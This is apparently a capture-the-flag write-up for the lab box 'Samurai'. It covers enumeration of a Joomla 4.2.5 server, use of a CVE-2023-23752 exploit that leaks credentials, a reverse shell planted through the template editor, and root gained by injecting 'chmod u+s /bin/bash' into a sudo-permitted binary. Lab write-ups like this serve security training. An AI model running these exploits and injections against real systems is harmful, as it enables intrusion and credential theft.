---
title: "Samurai"
platform: "HackSmarter"
category: "Linux"
difficulty: "Easy"
date: 2026-04-19
os: "Ubuntu 22.04"
tags: ["linux", "web", "joomla", "cve-2023-23752", "command-injection", "suid", "sudo"]
---

<div style="text-align: center;">
  <img src="/assets/images/ctf/samurai/banner.png" alt="Samurai Banner" style="max-width: 100%;" />
</div>

---

## Overview

**Platform:** HackSmarter
**OS:** Ubuntu 22.04
**Difficulty:** Easy
**IP:** `10.1.232.141`
**Hostname:** `streetcoder`

---

## Objective

As part of a penetration test, your team identified an interesting web server. Your task is to enumerate the target, establish an initial foothold, and escalate privileges to root.

---

## Attack Path Overview

```
Nmap → Apache/Joomla 4.2.5
         │
         ▼
CVE-2023-23752 → DB creds leaked via REST API
         │
         ▼
Joomla Admin Login (cred reuse) → Template PHP Injection → www-data shell
         │
         ▼
sudo -l → NOPASSWD /opt/backup/DbMaria
         │
         ▼
system() command injection → chmod u+s /bin/bash → root
```

---

## Enumeration

### Port Scan — Nmap

```bash
nmap -sCV 10.1.232.141 -Pn
```

```
Starting Nmap 7.93 ( https://nmap.org ) at 2026-04-19 13:55 PDT
Nmap scan report for 10.1.232.141
Host is up (0.071s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 c35a8350809a613705b74596cbab1d1e (ECDSA)
|_  256 6b1512601b21d1bf7eb8c0e8d77e7b6b (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Samurai
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 9.86 seconds
```

Two ports open — SSH on 22 and Apache on 80. Web is the primary attack surface.

### Directory Enumeration — Feroxbuster

```bash
feroxbuster -w `fzf-wordlists` -u "http://10.1.232.141"
```

```
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.1.232.141/
 🚩  In-Scope Url          │ 10.1.232.141
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wfuzz/general/common.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
301      GET        9l       28w      320c http://10.1.232.141/administrator => http://10.1.232.141/administrator/
301      GET        9l       28w      310c http://10.1.232.141/api => http://10.1.232.141/api/
301      GET        9l       28w      313c http://10.1.232.141/assets => http://10.1.232.141/assets/
301      GET        9l       28w      312c http://10.1.232.141/cache => http://10.1.232.141/cache/
301      GET        9l       28w      313c http://10.1.232.141/images => http://10.1.232.141/images/
301      GET        9l       28w      314c http://10.1.232.141/modules => http://10.1.232.141/modules/
301      GET        9l       28w      315c http://10.1.232.141/includes => http://10.1.232.141/includes/
301      GET        9l       28w      316c http://10.1.232.141/templates => http://10.1.232.141/templates/
301      GET        9l       28w      310c http://10.1.232.141/tmp => http://10.1.232.141/tmp/
301      GET        9l       28w      326c http://10.1.232.141/administrator/cache => http://10.1.232.141/administrator/cache/
301      GET        9l       28w      325c http://10.1.232.141/administrator/logs => http://10.1.232.141/administrator/logs/
301      GET        9l       28w      330c http://10.1.232.141/administrator/templates => http://10.1.232.141/administrator/templates/
```

The directory structure — `/administrator`, `/api`, `/templates`, `/modules` — is immediately recognisable as Joomla. Navigating to `/administrator` confirms the login panel.

<div style="text-align: center;">
  <img src="/assets/images/ctf/samurai/joomla-admin.png" alt="Joomla Admin Panel" style="max-width: 100%;" />
</div>

### CMS Fingerprinting — JoomScan

With Joomla confirmed, JoomScan identifies the exact version.

```bash
joomscan -u http://10.1.232.141
```

```
    ____  _____  _____  __  __  ___   ___    __    _  _
   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  (
  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
                        (1337.today)

    --=[OWASP JoomScan
    +---++---==[Version : 0.0.7
    +---++---==[Update Date : [2018/09/23]
    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
    --=[Code name : Self Challenge
    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP

Processing http://10.1.232.141 ...

[+] FireWall Detector
[++] Firewall not detected

[+] Detecting Joomla Version
[++] Joomla 4.2.5

[+] Core Joomla Vulnerability
[++] Target Joomla core is not vulnerable

[+] Checking apache info/status files
[++] Readable info/status files are not found

[+] admin finder
[++] Admin page : http://10.1.232.141/administrator/

[+] Checking robots.txt existing
[++] robots.txt is not found

[+] Finding common backup files name
[++] Backup files are not found

[+] Finding common log files name
[++] error log is not found

[+] Checking sensitive config.php.x file
[++] Readable config files are not found

Your Report : reports/10.1.232.141/
```

Joomla **4.2.5** — vulnerable to **CVE-2023-23752**, an unauthenticated information disclosure flaw that leaks database credentials through the public REST API at `/api/index.php/v1/config/application?public=true`.

---

## Foothold

### Credential Extraction — CVE-2023-23752

```bash
python3 CVE-2023-23752.py -u http://10.1.232.141
```

```
┏┓┓┏┏┓  ┏┓┏┓┏┓┏┓  ┏┓┏┓━┓┏━┏┓
┃ ┃┃┣ ━━┏┛┃┫┏┛ ┫━━┏┛ ┫ ┃┗┓┏┛
┗┛┗┛┗┛  ┗━┗┛┗━┗┛  ┗━┗┛ ╹┗┛┗━
Coded By: K3ysTr0K3R --> Hug me ʕっ•ᴥ•ʔっ
Updated By: muhammedikbalyildiz

[*] Checking if target is vulnerable
[+] Target is vulnerable
[*] Launching exploit against: http://10.1.232.141
---------------------------------------------------------------------------------------------------------------
[*] Checking if target is vulnerable for usernames at path: /api/index.php/v1/users?public=true
[+] Target is vulnerable for usernames
[+] Gathering user(s) for: http://10.1.232.141
[+] Name: Oda
[+] Username: Miyamoto
[+] Email: oda@local.local
[+] Group: Super Users
---------------------------------------------------------------------------------------------------------------
[*] Checking if target is vulnerable for credentials at path: /api/index.php/v1/config/application?public=true
[+] Target is vulnerable for credentials
[+] Gathering credential(s) for: http://10.1.232.141
[+] User: joomla425
[+] Password: Pa847word987@Joomla456
```

The exploit leaks both the admin username and the database password. Credential reuse against the admin panel works: `Miyamoto : Pa847word987@Joomla456`.

### Joomla Admin — Template PHP Injection

<div style="text-align: center;">
  <img src="/assets/images/ctf/samurai/joomla-dashboard.png" alt="Joomla Admin Dashboard" style="max-width: 100%;" />
</div>

With admin access, Joomla's template editor under **System → Templates** allows direct editing of PHP files. Injecting a reverse shell into an active template file triggers execution on the next page request.

<div style="text-align: center;">
  <img src="/assets/images/ctf/samurai/template-editor.png" alt="Joomla Template Editor" style="max-width: 100%;" />
</div>

### Catching the Shell

```bash
nc -lvnp 9001
```

```
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.1.232.141.
Ncat: Connection from 10.1.232.141:39226.
Linux streetcoder 5.15.0-171-generic #181-Ubuntu SMP Fri Feb 6 22:44:50 UTC 2026 x86_64 x86_64 x86_64 GNU/Linux
 21:21:25 up 30 min,  0 users,  load average: 0.00, 0.00, 0.13
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

### Shell Stabilisation

```bash
python3 -c "import pty;pty.spawn('/bin/bash')"
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## Privilege Escalation

### Sudo Enumeration

```bash
sudo -l
```

```
Matching Defaults entries for www-data on streetcoder:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User www-data may run the following commands on streetcoder:
    (root) NOPASSWD: /opt/backup/DbMaria
```

`www-data` can run `/opt/backup/DbMaria` as root without a password.

### Binary Analysis — DbMaria

Inspecting the binary's embedded strings reveals the full command template:

```
Usage: %s <database>
mariadb-dump --socket=/run/mysqld/mysqld.sock -u root %s > /tmp/backup.sql
```

The binary calls `system()` with our input interpolated directly into the shell command — no sanitisation. It also calls `setuid`, running the resulting shell command as root. Classic command injection.

### Exploitation — Command Injection → SUID Bash

Injecting a semicolon appends an arbitrary command after the `mariadb-dump` call. Setting the SUID bit on `/bin/bash` gives a persistent root escalation path.

```bash
sudo /opt/backup/DbMaria "x; chmod u+s /bin/bash"
```

```
/*M!999999\- enable the sandbox mode */
-- MariaDB dump 10.19  Distrib 10.6.23-MariaDB, for debian-linux-gnu (x86_64)
--
-- Host: localhost    Database: x
-- ------------------------------------------------------
-- Server version       10.6.23-MariaDB-0ubuntu0.22.04.1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;
mariadb-dump: Got error: 1049: "Unknown database 'x'" when selecting the database
```

The dump errors on the fake database `x` — but the injected `chmod u+s /bin/bash` executes as root regardless.

```bash
/bin/bash -p
```

```
bash-5.1# whoami
root
```

---

## Flags

### User Flag

```bash
bash-5.1# find -name user.txt 2>/dev/null
./var/www/user.txt
```

---

## Credentials Summary

```
Enumeration
────────────────────────────────────────────────────────────────
Miyamoto     : Pa847word987@Joomla456   → CVE-2023-23752 REST API leak
joomla425    : Pa847word987@Joomla456   → CVE-2023-23752 DB credential leak
```

---

## Tools Used

- **Nmap** - Port scanning and service enumeration
- **Feroxbuster** - Directory and endpoint discovery
- **JoomScan** - Joomla CMS version fingerprinting
- **CVE-2023-23752-EXPLOIT** - Unauthenticated Joomla credential disclosure
- **Netcat** - Reverse shell listener

---

## References

- [CVE-2023-23752 — Joomla Unauthenticated Information Disclosure](https://nvd.nist.gov/vuln/detail/CVE-2023-23752)
- [K3ysTr0K3R/CVE-2023-23752-EXPLOIT](https://github.com/K3ysTr0K3R/CVE-2023-23752-EXPLOIT)
- [GTFOBins — system() sudo abuse](https://gtfobins.github.io/)
